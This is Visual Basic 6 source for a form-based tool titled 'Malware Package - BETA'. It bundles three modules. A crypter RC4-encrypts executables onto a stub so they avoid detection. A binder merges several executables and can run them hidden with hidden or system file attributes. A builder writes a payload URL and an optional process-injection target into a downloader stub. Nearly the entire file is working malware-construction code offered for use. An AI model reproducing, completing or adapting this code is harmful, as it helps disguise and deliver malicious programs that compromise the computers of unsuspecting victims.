VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "comctl32.ocx"
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.1#0"; "TABCTL32.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Malware Package - BETA"
   ClientHeight    =   3210
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   6945
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3210
   ScaleWidth      =   6945
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin TabDlg.SSTab SSTab1 
      Height          =   3255
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6975
      _ExtentX        =   12303
      _ExtentY        =   5741
      _Version        =   393216
      Tabs            =   4
      Tab             =   3
      TabsPerRow      =   4
      TabHeight       =   520
      BackColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      TabCaption(0)   =   "Scrambler"
      TabPicture(0)   =   "Form1.frx":0E42
      Tab(0).ControlEnabled=   0   'False
      Tab(0).Control(0)=   "Frame1"
      Tab(0).ControlCount=   1
      TabCaption(1)   =   "Binder"
      TabPicture(1)   =   "Form1.frx":0E5E
      Tab(1).ControlEnabled=   0   'False
      Tab(1).Control(0)=   "Timer1"
      Tab(1).Control(1)=   "ListView1"
      Tab(1).Control(2)=   "ProgressBar2"
      Tab(1).Control(3)=   "stb"
      Tab(1).Control(4)=   "Label6"
      Tab(1).Control(5)=   "Label5"
      Tab(1).ControlCount=   6
      TabCaption(2)   =   "Downloader"
      TabPicture(2)   =   "Form1.frx":0E7A
      Tab(2).ControlEnabled=   0   'False
      Tab(2).Control(0)=   "Label4"
      Tab(2).Control(1)=   "txtURL"
      Tab(2).Control(2)=   "cmbProcess"
      Tab(2).Control(3)=   "Command6"
      Tab(2).Control(4)=   "chkInject"
      Tab(2).ControlCount=   5
      TabCaption(3)   =   "About"
      TabPicture(3)   =   "Form1.frx":0E96
      Tab(3).ControlEnabled=   -1  'True
      Tab(3).Control(0)=   "Line3(1)"
      Tab(3).Control(0).Enabled=   0   'False
      Tab(3).Control(1)=   "Line2(1)"
      Tab(3).Control(1).Enabled=   0   'False
      Tab(3).Control(2)=   "Line1(1)"
      Tab(3).Control(2).Enabled=   0   'False
      Tab(3).Control(3)=   "Label7"
      Tab(3).Control(3).Enabled=   0   'False
      Tab(3).Control(4)=   "Label8"
      Tab(3).Control(4).Enabled=   0   'False
      Tab(3).Control(5)=   "Picture1(1)"
      Tab(3).Control(5).Enabled=   0   'False
      Tab(3).Control(6)=   "Text4(1)"
      Tab(3).Control(6).Enabled=   0   'False
      Tab(3).ControlCount=   7
      Begin VB.Timer Timer1 
         Interval        =   250
         Left            =   -74880
         Top             =   2760
      End
      Begin VB.CheckBox chkInject 
         Caption         =   "Inject Into Process"
         Height          =   255
         Left            =   -74040
         TabIndex        =   23
         Top             =   1080
         Width           =   1695
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Build"
         Height          =   375
         Left            =   -72240
         TabIndex        =   22
         Top             =   2400
         Width           =   1335
      End
      Begin VB.ComboBox cmbProcess 
         Enabled         =   0   'False
         Height          =   315
         ItemData        =   "Form1.frx":0EB2
         Left            =   -69960
         List            =   "Form1.frx":0EC8
         Style           =   2  'Dropdown List
         TabIndex        =   21
         Top             =   1080
         Width           =   1215
      End
      Begin VB.TextBox txtURL 
         Height          =   285
         Left            =   -74040
         TabIndex        =   19
         Text            =   "http://site.com/server.exe"
         Top             =   720
         Width           =   5295
      End
      Begin VB.TextBox Text4 
         BackColor       =   &H8000000F&
         BorderStyle     =   0  'None
         Height          =   1455
         Index           =   1
         Left            =   2760
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   18
         Text            =   "Form1.frx":0EFB
         Top             =   960
         Width           =   3375
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   1935
         Index           =   1
         Left            =   480
         Picture         =   "Form1.frx":0F8D
         ScaleHeight     =   1905
         ScaleWidth      =   1905
         TabIndex        =   17
         Top             =   720
         Width           =   1935
      End
      Begin VB.Frame Frame1 
         Height          =   2775
         Left            =   -74880
         TabIndex        =   4
         Top             =   300
         Width           =   6735
         Begin VB.TextBox txtCommand 
            Height          =   285
            Left            =   3840
            TabIndex        =   24
            Text            =   "Text5"
            Top             =   2760
            Visible         =   0   'False
            Width           =   2895
         End
         Begin VB.TextBox Text1 
            Height          =   285
            Left            =   120
            TabIndex        =   13
            Top             =   480
            Width           =   5175
         End
         Begin VB.CommandButton Command1 
            Caption         =   "..."
            Height          =   255
            Left            =   5400
            TabIndex        =   12
            Top             =   480
            Width           =   1095
         End
         Begin VB.TextBox Text2 
            Height          =   285
            Left            =   120
            TabIndex        =   11
            Top             =   1080
            Width           =   5175
         End
         Begin VB.CommandButton Command2 
            Caption         =   "..."
            Height          =   255
            Left            =   5400
            TabIndex        =   10
            Top             =   1080
            Width           =   1095
         End
         Begin VB.TextBox Text3 
            Height          =   285
            Left            =   120
            TabIndex        =   9
            Top             =   1680
            Width           =   5175
         End
         Begin VB.CommandButton Command3 
            Caption         =   "..."
            Height          =   255
            Left            =   5400
            TabIndex        =   8
            Top             =   1680
            Width           =   1095
         End
         Begin VB.CommandButton Command4 
            Caption         =   "Scramble"
            Height          =   375
            Left            =   1440
            TabIndex        =   6
            Top             =   2040
            Width           =   1095
         End
         Begin VB.CommandButton Command5 
            Caption         =   "Quit"
            Height          =   375
            Left            =   3480
            TabIndex        =   5
            Top             =   2040
            Width           =   1095
         End
         Begin ComctlLib.ProgressBar ProgressBar1 
            Height          =   255
            Left            =   0
            TabIndex        =   7
            Top             =   2520
            Width           =   6735
            _ExtentX        =   11880
            _ExtentY        =   450
            _Version        =   327682
            Appearance      =   1
         End
         Begin VB.Label Label1 
            Caption         =   "File To Scramble :"
            Height          =   255
            Left            =   120
            TabIndex        =   16
            Top             =   240
            Width           =   1335
         End
         Begin VB.Label Label2 
            Caption         =   "Change Icon :"
            Height          =   255
            Left            =   120
            TabIndex        =   15
            Top             =   840
            Width           =   1215
         End
         Begin VB.Label Label3 
            Caption         =   "Path To Stub :"
            Height          =   255
            Left            =   120
            TabIndex        =   14
            Top             =   1440
            Width           =   1335
         End
      End
      Begin ComctlLib.ListView ListView1 
         Height          =   2295
         Left            =   -74880
         TabIndex        =   1
         Top             =   480
         Width           =   6735
         _ExtentX        =   11880
         _ExtentY        =   4048
         View            =   3
         MultiSelect     =   -1  'True
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         _Version        =   327682
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   9
         BeginProperty ColumnHeader(1) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "FilePath"
            Object.Width           =   7761
         EndProperty
         BeginProperty ColumnHeader(2) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   1
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Extraction Name"
            Object.Width           =   2486
         EndProperty
         BeginProperty ColumnHeader(3) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Alignment       =   2
            SubItemIndex    =   2
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Execution"
            Object.Width           =   1658
         EndProperty
         BeginProperty ColumnHeader(4) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Alignment       =   2
            SubItemIndex    =   3
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Execution Style"
            Object.Width           =   2293
         EndProperty
         BeginProperty ColumnHeader(5) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Alignment       =   2
            SubItemIndex    =   4
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Delay"
            Object.Width           =   1323
         EndProperty
         BeginProperty ColumnHeader(6) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   5
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Delay (Milliseconds)"
            Object.Width           =   2892
         EndProperty
         BeginProperty ColumnHeader(7) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   6
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Parameters"
            Object.Width           =   2011
         EndProperty
         BeginProperty ColumnHeader(8) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Alignment       =   2
            SubItemIndex    =   7
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Attributes"
            Object.Width           =   2117
         EndProperty
         BeginProperty ColumnHeader(9) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   8
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "File Size (KB)"
            Object.Width           =   1059
         EndProperty
      End
      Begin ComctlLib.ProgressBar ProgressBar2 
         Height          =   255
         Left            =   -74880
         TabIndex        =   2
         Top             =   3000
         Width           =   6735
         _ExtentX        =   11880
         _ExtentY        =   450
         _Version        =   327682
         Appearance      =   1
      End
      Begin ComctlLib.StatusBar stb 
         Height          =   255
         Left            =   -74880
         TabIndex        =   3
         Top             =   2760
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   450
         SimpleText      =   ""
         _Version        =   327682
         BeginProperty Panels {0713E89E-850A-101B-AFC0-4210102A8DA7} 
            NumPanels       =   1
            BeginProperty Panel1 {0713E89F-850A-101B-AFC0-4210102A8DA7} 
               Text            =   "Files: 0"
               TextSave        =   "Files: 0"
               Key             =   ""
               Object.Tag             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComDlg.CommonDialog CommonDialog1 
         Left            =   0
         Top             =   -300
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.Label Label8 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "                   http://wl-group.net"
         BeginProperty Font 
            Name            =   "Lucida Console"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   495
         Left            =   3960
         TabIndex        =   28
         Top             =   2760
         Width           =   2295
      End
      Begin VB.Label Label7 
         Alignment       =   2  'Center
         Caption         =   "If you're facing any errors or you notice any bugs please let us know on             "
         BeginProperty Font 
            Name            =   "Lucida Console"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   240
         TabIndex        =   27
         Top             =   2760
         Width           =   6255
      End
      Begin VB.Label Label6 
         Height          =   255
         Left            =   -68880
         TabIndex        =   26
         Top             =   2760
         Width           =   735
      End
      Begin VB.Label Label5 
         Caption         =   "Overall Size:"
         Height          =   255
         Left            =   -69840
         TabIndex        =   25
         Top             =   2760
         Width           =   975
      End
      Begin VB.Label Label4 
         Caption         =   "URL :"
         Height          =   255
         Left            =   -74520
         TabIndex        =   20
         Top             =   720
         Width           =   495
      End
      Begin VB.Line Line1 
         Index           =   1
         X1              =   2400
         X2              =   6480
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Line Line2 
         Index           =   1
         X1              =   6480
         X2              =   6480
         Y1              =   2640
         Y2              =   720
      End
      Begin VB.Line Line3 
         Index           =   1
         X1              =   2400
         X2              =   6480
         Y1              =   720
         Y2              =   720
      End
   End
   Begin VB.Menu mnuFile 
      Caption         =   "File"
      Visible         =   0   'False
      Begin VB.Menu mnuFileOpt 
         Caption         =   "File Options"
         Begin VB.Menu mnuAdd 
            Caption         =   "Add"
         End
         Begin VB.Menu mnuRemove 
            Caption         =   "Remove"
         End
         Begin VB.Menu mnuClear 
            Caption         =   "Clear"
         End
      End
      Begin VB.Menu mnuOptions 
         Caption         =   "Options"
         Begin VB.Menu mnuExtraction 
            Caption         =   "Extraction"
            Begin VB.Menu mnuExName 
               Caption         =   "Change Extraction Name"
            End
         End
      End
      Begin VB.Menu mnuEx 
         Caption         =   "Execution Type"
         Begin VB.Menu mnuExTrue 
            Caption         =   "True"
         End
         Begin VB.Menu mnuExFalse 
            Caption         =   "False"
         End
         Begin VB.Menu mnuExStyle 
            Caption         =   "Execution Style"
            Begin VB.Menu mnuExNorm 
               Caption         =   "Normal"
            End
            Begin VB.Menu mnuExHidden 
               Caption         =   "Hidden"
            End
            Begin VB.Menu mnuExMax 
               Caption         =   "Maximised"
            End
            Begin VB.Menu mnuExMin 
               Caption         =   "Minimized"
            End
         End
         Begin VB.Menu mnuDelay 
            Caption         =   "Delay"
            Begin VB.Menu mnuDelTrue 
               Caption         =   "True"
            End
            Begin VB.Menu mnuDelFalse 
               Caption         =   "False"
            End
            Begin VB.Menu mnuAdjustDelay 
               Caption         =   "Adjust Delay"
            End
         End
         Begin VB.Menu mnuParam 
            Caption         =   "Parameters"
            Begin VB.Menu mnuAdjParams 
               Caption         =   "Adjust Paramters"
            End
         End
         Begin VB.Menu mnuAttrib 
            Caption         =   "Attributes"
            Begin VB.Menu mnuAttribNorm 
               Caption         =   "Normal"
            End
            Begin VB.Menu mnuAttribHidden 
               Caption         =   "Hidden"
            End
            Begin VB.Menu mnuAttribReadOnly 
               Caption         =   "Read Only"
            End
            Begin VB.Menu mnuAttribSystem 
               Caption         =   "System"
            End
            Begin VB.Menu mnuAttribTemp 
               Caption         =   "Temp"
            End
            Begin VB.Menu mnuAttribComp 
               Caption         =   "Compressed"
            End
         End
         Begin VB.Menu mnuStartup 
            Caption         =   "Startup"
            Enabled         =   0   'False
            Visible         =   0   'False
            Begin VB.Menu mnuStartTrue 
               Caption         =   "True"
               Enabled         =   0   'False
               Visible         =   0   'False
            End
            Begin VB.Menu mnuStartFalse 
               Caption         =   "False"
               Enabled         =   0   'False
            End
         End
      End
      Begin VB.Menu mnuBuild 
         Caption         =   "Build"
         Enabled         =   0   'False
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim StubPath As String
Dim StubData As String
Dim EOFData As String
Const FileSplit = "\/\/"
Const SetSplit = "||||"
Public Sums As Long
Private WithEvents objDOS As DOSOutputs
Attribute objDOS.VB_VarHelpID = -1

Private Sub chkInject_Click()
    If chkInject.Value = 1 Then cmbProcess.Enabled = True
    If chkInject.Value = 0 Then cmbProcess.Enabled = False
End Sub

Private Sub Command1_Click()
ProgressBar1.Value = 0
CommonDialog1.DialogTitle = "Please choose file to crypt..."
CommonDialog1.InitDir = App.Path
CommonDialog1.Filter = "Executable Files (*.exe) | *.exe"
CommonDialog1.ShowOpen
Text1.Text = CommonDialog1.FileName
End Sub

Private Sub Command2_Click()
ProgressBar1.Value = 0
CommonDialog1.DialogTitle = "Please choose new icon..."
CommonDialog1.InitDir = App.Path
CommonDialog1.Filter = "Icon Files (*.ico) | *.ico"
CommonDialog1.ShowOpen
Text2.Text = CommonDialog1.FileName
End Sub

Private Sub Command3_Click()
ProgressBar1.Value = 0
CommonDialog1.DialogTitle = "Please choose custom stub file..."
CommonDialog1.InitDir = App.Path
CommonDialog1.Filter = "Executable Files (*.exe) | *.exe"
CommonDialog1.ShowOpen
Text3.Text = CommonDialog1.FileName
StubPath = Text3.Text
End Sub

Public Sub wait(s As Single)
Dim T1 As Single
T1 = Timer
Do While T1 + s > Timer
DoEvents
Loop
End Sub

Function split(file As String, filesize As String)
Dim filesize1 As Long, n As Long, retrieve As String, lastchunk As String, i As Long
filesize1 = CLng(filesize)
Open file For Binary Access Read As #11
DoEvents
retrieve = Space(filesize1)
Get #11, , retrieve
StubData = RC4(retrieve, "darkdays")
If LOF(11) - ((Int((LOF(11) / filesize1))) * (filesize1)) = 0 Then GoTo clse
lastchunk = Space(LOF(11) - ((Int(LOF(11) / filesize1)) * (filesize1)))
Get #11, , lastchunk
EOFData = lastchunk
clse:
Close #11
End Function

Private Sub Command4_Click()
Dim data As String
Dim Stub As String
Dim PI As String
Dim Buffer() As Byte
Dim fsiz As Integer
Dim a As Integer
ProgressBar1.Value = 5
Dim REALIGN() As Byte
Dim VALIDATE() As Byte
If Text1.Text = "" Then
MsgBox "Please choose a file to crypt!", vbCritical, "Malware Package"
Exit Sub
End If
If Text3.Text = "" Then
MsgBox "Please choose a stub file!", vbCritical, "Malware Package"
Exit Sub
End If
REALIGN = LoadResData(101, "CUSTOM")
VALIDATE = LoadResData(102, "CUSTOM")
Open "C:\REALIGN.dll" For Binary As #6
Put #6, , REALIGN
Close #6
DoEvents
Open "C:\VALIDATEPE.exe" For Binary As #7
Put #7, , VALIDATE
Close #7
DoEvents
Call split(Text1.Text, GetEOF(Text1.Text))
DoEvents
wait (1)
Open Text1.Text For Binary As #1
data = Space(LOF(1))
Get #1, , data
Close #1
ProgressBar1.Value = 20
Dim FileNum As Integer
FileNum = FreeFile
Open StubPath For Binary As #FileNum
Buffer() = String$(LOF(FileNum), vbNullChar)
Get #FileNum, , Buffer()
Close #FileNum
CommonDialog1.Filter = "Executable Files (*.exe) | *.exe"
CommonDialog1.DialogTitle = "Choose where to save to..."
CommonDialog1.ShowSave
ProgressBar1.Value = 50
Open CommonDialog1.FileName For Binary As #2
Put #2, , Buffer
Put #2, , "#####" + StubData
Put #2, , "#####" + EOFData
ProgressBar1.Value = 50
DoEvents
Close #2
txtCommand.Text = Chr(34) & "C:\VALIDATEPE.exe" & Chr(34) & " " & Chr(34) & CommonDialog1.FileName & Chr(34)
objDOS.CommandLine = txtCommand.Text
objDOS.ExecuteCommand
If Not Text2.Text = "" Then
ReplaceIcons Text2.Text, CommonDialog1.FileName, Err
End If
Kill "C:\REALIGN.dll"
Kill "C:\VALIDATEPE.exe"
DoEvents
Buffer = ""
StubData = ""
data = ""
EOFData = ""
txtCommand.Text = ""
ProgressBar1.Value = 100
MsgBox "File successfully crypted and saved to " & CommonDialog1.FileName, vbOKOnly, "Malware Package"
End Sub

Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
On Error Resume Next
Dim RB(0 To 255) As Integer, X As Long, Y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
If Len(Password) = 0 Then
Exit Function
End If
If Len(Expression) = 0 Then
Exit Function
End If
If Len(Password) > 256 Then
Key() = StrConv(Left$(Password, 256), vbFromUnicode)
Else
Key() = StrConv(Password, vbFromUnicode)
End If
For X = 0 To 255
RB(X) = X
Next X
X = 0
Y = 0
Z = 0
For X = 0 To 255
Y = (Y + RB(X) + Key(X Mod Len(Password))) Mod 256
Temp = RB(X)
RB(X) = RB(Y)
RB(Y) = Temp
Next X
X = 0
Y = 0
Z = 0
ByteArray() = StrConv(Expression, vbFromUnicode)
For X = 0 To Len(Expression)
Y = (Y + 1) Mod 256
Z = (Z + RB(Y)) Mod 256
Temp = RB(Y)
RB(Y) = RB(Z)
RB(Z) = Temp
ByteArray(X) = ByteArray(X) Xor (RB((RB(Y) + RB(Z)) Mod 256))
Next X
RC4 = StrConv(ByteArray, vbUnicode)
End Function

Private Sub Command5_Click()
End
End Sub

Private Sub Command6_Click()
On Error Resume Next
    If Not FileExistss(App.Path & "\DownloaderStub.dat") Then MsgBox "stub not found", vbCritical: Exit Sub

    Dim ff As Long
    Dim sFile As String
    
    ff = FreeFile
    
    Open App.Path & "\DownloaderStub.dat" For Binary Access Read As ff
        sFile = Input(FileLen(App.Path & "\DownloaderStub.dat"), ff)
    Close ff
    
    ff = FreeFile
    Open App.Path & "\downloader.exe" For Binary Access Write As ff
        Put ff, , sFile
    Close ff
    MsgBox "If you want to pack the file, then do it now." & vbNewLine & "Click OK to continue", vbInformation
    
    Open App.Path & "\downloader.exe" For Binary Access Write As #1
        Seek #1, FileLen(App.Path & "\downloader.exe")
        Put #1, , "##########" & EncryptData(txtURL, "frmMain", True)
        If chkInject.Value = 1 Then Put #1, , "##########" & EncryptData(cmbProcess.Text, "frmMain", True)
        If chkInject.Value = 0 Then Put #1, , "##########" & EncryptData("null", "frmMain", True)
    Close #1
End Sub

Private Function FileExistss(fname$)
    On Local Error Resume Next
    Dim ff
    ff = FreeFile
    Open fname$ For Input As ff
    If Err Then
    FileExistss = False
    Else
    FileExistss = True
    End If
    Close ff
End Function

Private Sub Command7_Click()
End
End Sub

Private Sub Form_Initialize()
XPStyle
End Sub

Private Sub Form_Load()
Set objDOS = New DOSOutputs
Sums = 20
Label6.Caption = CStr(Sums) + " Kb"
End Sub

Private Sub Label8_Click()
Call ShellExecute(&O0, vbNullString, "http://www.wl-group.net", vbNullString, vbNullString, vbNormalFocus)
End Sub

Private Sub ListView1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If ListView1.ListItems.Count = 0 Then
mnuOptions.Enabled = False
mnuBuild.Enabled = False
Else
mnuOptions.Enabled = True
mnuBuild.Enabled = True
End If
If Button = 2 Then
Me.PopupMenu mnuFile
End If
End Sub

Private Sub mnuAdd_Click()
On Error GoTo Error
    CommonDialog1.CancelError = True
    CommonDialog1.Filter = "All Files (*.*) | *.*"
    CommonDialog1.ShowOpen
    With ListView1.ListItems.Add(, , CommonDialog1.FileName)
        .SubItems(1) = CommonDialog1.FileTitle
        .SubItems(2) = "True"
        .SubItems(3) = "Normal"
        .SubItems(4) = "False"
        .SubItems(5) = "N/A"
        .SubItems(7) = "Normal"
        .SubItems(8) = Val((FileLen(CommonDialog1.FileName)) / Val(1024))
End With
stb.Panels(1).Text = "Files: " & ListView1.ListItems.Count
Sums = Sums + Val((FileLen(CommonDialog1.FileName)) / Val(1024))
Label6.Caption = CStr(Sums) + " Kb"
Error:
End Sub

Private Sub mnuAdjParams_Click()
Dim sParams As String
sParams = InputBox("Please enter some parameters.", "Parameters", "")
ListView1.SelectedItem.SubItems(6) = sParams
End Sub

Private Sub mnuAdjustDelay_Click()
Dim sTime As String
sTime = InputBox("Please enter a delay amount, in milliseconds." & vbCrLf & vbCrLf & "EG: 1000 = 1 Second", "Delay", 1000)
ListView1.SelectedItem.SubItems(4) = "True"
ListView1.SelectedItem.SubItems(5) = sTime
End Sub

Private Sub mnuAttribComp_Click()
ListView1.SelectedItem.SubItems(7) = "Compressed"
End Sub

Private Sub mnuAttribHidden_Click()
ListView1.SelectedItem.SubItems(7) = "Hidden"
End Sub

Private Sub mnuAttribNorm_Click()
ListView1.SelectedItem.SubItems(7) = "Normal"
End Sub

Private Sub mnuAttribReadOnly_Click()
ListView1.SelectedItem.SubItems(7) = "Read Only"
End Sub

Private Sub mnuAttribSystem_Click()
ListView1.SelectedItem.SubItems(7) = "System"
End Sub

Private Sub mnuAttribTemp_Click()
ListView1.SelectedItem.SubItems(7) = "Temp"
End Sub

Private Sub mnuBuild_Click()
On Error Resume Next
Dim strFile As String
Dim strDataOut As String
Dim Stub As String
Dim strTimeVar As String
Dim strTime As String
Dim sEx As String
Dim sParam As String
Dim sAttribute As String
Dim sName As String
Dim sExStyle As String
Dim i As Integer
If ListView1.ListItems.Count < 2 Then
MsgBox "You need at least 2 files to bind", vbCritical, "Error"
Exit Sub
End If
CommonDialog1.Filter = "Executable Files (*.exe) | *.exe"
CommonDialog1.FileName = "Binded"
CommonDialog1.ShowSave
If FileExists(CommonDialog1.FileName) = True Then
Kill CommonDialog1.FileName
End If
Open App.Path & "\BinderStub.exe" For Binary As #1
    Stub = Space(LOF(1))
'Stub = App.Path & "\BinderStub.exe"
    Get #1, , Stub
Close #1
Open CommonDialog1.FileName For Binary As #1
Put #1, , Stub
Close #1
For i = 1 To ListView1.ListItems.Count
DoEvents
Open ListView1.ListItems.Item(i) For Binary As #1
strFile = Space(LOF(1))
Get #1, , strFile
Close #1
sName = ListView1.ListItems.Item(i).SubItems(1)
sEx = ListView1.ListItems.Item(i).SubItems(2)
sExStyle = ListView1.ListItems.Item(i).SubItems(3)
strTime = ListView1.ListItems.Item(i).SubItems(4)
strTimeVar = ListView1.ListItems.Item(i).SubItems(5)
sParam = ListView1.ListItems.Item(i).SubItems(6)
sAttribute = ListView1.ListItems.Item(i).SubItems(7)
Select Case (sExStyle)
        Case "Hidden":
            sExStyle = 0
        Case "Normal":
            sExStyle = 1
        Case "Maximized":
            sExStyle = 3
        Case "Minimized":
            sExStyle = 6
    End Select
strDataOut = FileSplit & strFile & SetSplit & sEx & SetSplit & strTime & SetSplit & strTimeVar & SetSplit & sParam & SetSplit & sAttribute & SetSplit & sName & SetSplit & sExStyle & SetSplit & FileSplit
Open CommonDialog1.FileName For Binary As #1
Put #1, LOF(1), strDataOut
Close #1
Next i
MsgBox "Files bound and saved to " & CommonDialog1.FileName, vbInformation, "Done!"
End Sub

Private Sub mnuDelFalse_Click()
ListView1.SelectedItem.SubItems(3) = "False"
ListView1.SelectedItem.SubItems(5) = "N/A"
End Sub

Private Sub mnuDelTrue_Click()
Dim sTime As String
sTime = InputBox("Please enter a delay amount, in milliseconds." & vbCrLf & vbCrLf & "EG: 1000 = 1 Second", "Delay", 1000)
ListView1.SelectedItem.SubItems(2) = "True"
ListView1.SelectedItem.SubItems(4) = "True"
ListView1.SelectedItem.SubItems(5) = sTime
End Sub

Private Sub mnuExFalse_Click()
ListView1.SelectedItem.SubItems(2) = "False"
ListView1.SelectedItem.SubItems(3) = "N/A"
ListView1.SelectedItem.SubItems(5) = "N/A"
End Sub

Private Sub mnuExHidden_Click()
ListView1.SelectedItem.SubItems(3) = "Hidden"
End Sub

Private Sub mnuExMax_Click()
ListView1.SelectedItem.SubItems(3) = "Maximized"
End Sub

Private Sub mnuExMin_Click()
ListView1.SelectedItem.SubItems(3) = "Minimized"
End Sub

Private Sub mnuExName_Click()
Dim sName As String
sName = InputBox("Please enter a extraction name for the file", "Change Name", "")
ListView1.SelectedItem.SubItems(1) = sName
End Sub

Private Sub mnuExNorm_Click()
ListView1.SelectedItem.SubItems(3) = "Normal"
End Sub

Private Sub mnuExTrue_Click()
ListView1.SelectedItem.SubItems(2) = "True"
ListView1.SelectedItem.SubItems(3) = "Normal"
End Sub

Private Sub mnuRemove_Click()
On Error Resume Next
Sums = Sums - Val(ListView1.ListItems.Item(1).SubItems(8))
ListView1.ListItems.Remove (ListView1.SelectedItem.Index)
stb.Panels(1).Text = "Files: " & ListView1.ListItems.Count
End Sub

Private Sub mnuExit_Click()
End
End Sub

Private Sub mnuStartFalse_Click()
ListView1.SelectedItem.SubItems(8) = "False"
End Sub

Private Sub mnuStartTrue_Click()
ListView1.SelectedItem.SubItems(8) = "True"
End Sub

Private Function FileExists(fname As String) As Boolean
If fname = "" Or Right(fname, 1) = "\" Then
FileExists = False: Exit Function
End If
FileExists = (Dir(fname) <> "")
End Function

Private Sub mnuClear_Click()
On Error Resume Next
ListView1.ListItems.Clear
stb.Panels(1).Text = "Files: " & ListView1.ListItems.Count
Sums = ""
Sums = 20
End Sub

Private Sub muRemove_Click()

End Sub

Private Sub SSTab1_DblClick()

End Sub

Private Sub Timer1_Timer()
Label6.Caption = CStr(Sums) + " Kb"
End Sub
